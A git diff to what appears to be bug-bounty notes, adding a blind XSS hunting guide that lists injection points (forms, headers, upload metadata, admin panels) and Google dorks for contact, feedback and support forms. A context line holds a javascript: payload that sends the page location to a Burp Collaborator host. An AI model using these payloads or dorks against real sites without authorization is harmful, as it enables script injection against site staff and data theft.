@@ -184,6 +184,70 @@ Automation:
 javascript:window.location="https://example.burpcollaborator.net/js-scheme?"+btoa(document.location)
 
 
+====================================================================================================================================
+
+Blind XSS Hunting Guide
+Blind XSS vulnerabilities can be elusive, but knowing where to look can help in identifying them. Below are some common areas to hunt for Blind XSS:
+
+User Input Fields:
+Account creation forms: Username, email, phone number, address fields.
+Profile update forms: Bio, profile picture metadata, job titles.
+Contact and feedback forms: Name, email, message.
+Comment sections and user posts: Blog comments, forums, reviews.
+Support and ticketing systems: Issue descriptions, attachments metadata.
+Email-Related Workflows:
+Email registration and verification processes.
+Password reset forms (e.g., inject payload into email field).
+Unsubscribe links: Modify or add payload in email fields.
+Administrative Panels (Back-End Systems):
+Internal dashboards: Reflection of user-generated content.
+Audit logs: Monitor if inputs are logged in dashboards.
+Email notifications to admins (triggered by user input).
+Headers and Metadata:
+User-Agent, Referer, Accept headers in HTTP requests.
+API requests with custom headers that log data.
+Metadata in file uploads (EXIF, image metadata).
+Web Application Workflows:
+Password reset workflows (inject in email or hidden fields).
+Subscription or unsubscribe workflows (alter email input).
+Forms triggered by dynamic events.
+File Uploads and Attachments:
+File metadata injection (name, type, or description fields).
+Upload forms: Include hidden inputs where Blind XSS might trigger during review.
+Notifications and Alerts:
+Email notifications sent to users or admins based on submitted forms.
+System alerts and pop-ups generated from submitted feedback.
+Burp Suite Opportunities:
+Intercept and modify HTTP requests: Inject payloads into parameters or headers.
+Repeat requests: Modify with different Blind XSS payloads targeting multiple headers.
+
+
+----------------------------------------------------------------------------------
+Dorks:
+------
+site:google.com intitle:"contact.php" | intitle:"contactus" | intitle:"contactus.php" | intitle:"contactus.aspx" | intitle:"contactus.asp" | intitle:"contactus.html" | intitle:"contact-us.html" | intitle:"contact_us.html" | intitle:"contact.html" | intitle:"contactus.html"
+
+site:google.com inurl:"contact.php" | inurl:"contactus" | inurl:"contactus.php" | inurl:"contactus.aspx" | inurl:"contactus.asp" | inurl:"contactus.html" | inurl:"contact-us.html" | inurl:"contact_us.html" | inurl:"contact.html" | inurl:"contactus.html"
+
+site:google.com inurl:"feedback.php" | inurl:"send feedback" | inurl:"feedbackus.php" | inurl:"feedback.aspx" | inurl:"feedback.asp" | inurl:"feedback.html" | intitle:"send feedback"
+
+site:google.com inurl:"Send Us a Message" | intitle:"Send Us a Message"
+
+site:google.com intitle:"support.php" | intitle:"support" | intitle:"contactus.php" | intitle:"support.aspx" | intitle:"support.asp" | intitle:"support.html" | intitle:"support-us.html"
+
+site:google.com inurl:"submit messages" | inurl:"submit" | inurl:"submit messages" | inurl:"submit form" | intitle:"submit form"
+
+site:google.com inurl:"Support Center" | intitle:"Support Center"
+
+site:google.com intitle:"submit.php" | intitle:"submit" | intitle:"submit.php" | intitle:"submit.aspx" | intitle:"submit.asp" | intitle:"submit.html" | intitle:"submit-us.html" | intitle:"submit_us.html" | intitle:"submit.html" | intitle:"submit.html"
+
+site:google.com inurl:"submit a request" | intitle:"submit a request"
+
+site:google.com inurl:"submit a report" | intitle:"submit a report"
+
+site:google.com intext:"Attachments (optional)"
+
+site:google.com inurl:"request-form" | inurl:"submit-a-request" | inurl:"request-form.aspx" | inurl:"request.php" | intitle:"request form"
 
 
 
@@ -192,3 +256,4 @@ javascript:window.location="https://example.burpcollaborator.net/js-scheme?"+bto
 
 
 
+Thanks:) 
